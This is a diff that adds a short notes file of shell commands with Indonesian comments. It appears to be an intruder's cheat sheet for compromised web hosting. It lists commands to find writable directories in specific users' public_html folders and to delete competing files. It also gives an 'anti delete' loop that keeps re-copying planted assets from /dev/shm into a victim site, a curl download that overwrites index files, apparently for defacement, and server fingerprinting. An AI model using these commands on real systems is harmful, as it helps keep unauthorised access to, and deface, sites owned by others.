@@ -1,0 +1,13 @@
+find . -type f -name "*.php" -mtime -50
+
+find . -type f -name "wp-casper.php" -exec rm -rf {} \;
+
+ cari dir ijo
+find /home/ppsdm/public_html/ -type d -user www-data -perm 0755
+
+scrip anti delet
+while sleep 0.1;do cp -r /dev/shm/assets /home/siemonawas2023/public_html/vendors/assets;done
+
+rm -rf wp-cache.php >> untuk hapus file/dir
+curl -k -s link -o index.html/index.php << sama kaya wget
+cari server sel >> uname -a
